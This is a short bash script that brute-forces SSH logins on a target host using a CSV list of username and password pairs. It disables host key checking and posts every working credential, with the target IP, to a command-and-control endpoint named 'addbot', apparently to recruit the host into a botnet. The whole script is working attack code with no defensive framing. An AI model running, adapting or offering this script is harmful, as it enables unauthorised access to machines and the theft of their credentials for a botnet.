#!/bin/bash
INPUT=password.csv
OUTPUTFILE=userPassIPFile.txt
OLDIFS=$IFS
IFS=','
uname=""
pass=""

cnc=192.168.1.18:5000
[ ! -f $INPUT ] && { echo "$INPUT file not found"; exit 99; }
while read username password
do
	trap 'echo ""; echo"" ;echo "Skipped by the user"; echo"";echo "exiting this $1";exit 0' INT
	uname=$username
	pass=$password
	echo "trying $username and $password."
	sshpass -p "$password" ssh -oStrictHostKeyChecking=no $username@$1 &>/dev/null
	if [ $? -eq 0 ]
	then
		echo "Username : $username"
		echo "Password : $password"
		break
	fi
done < $INPUT
IFS=$OLDIFS
val=$1,$uname,$pass
if [[ $uname == "NA" ]]
then
	echo ""
	echo "user name and password not found for $1"
	echo ""
	exit 0
fi
curl --header "Content-Type: application/json" --request POST --data "{\"ip\":\"$1\",\"username\":\"$uname\",\"password\":\"$pass\"}" http://$cnc/addbot
echo "$val" >>$OUTPUTFILE
echo "$val added"
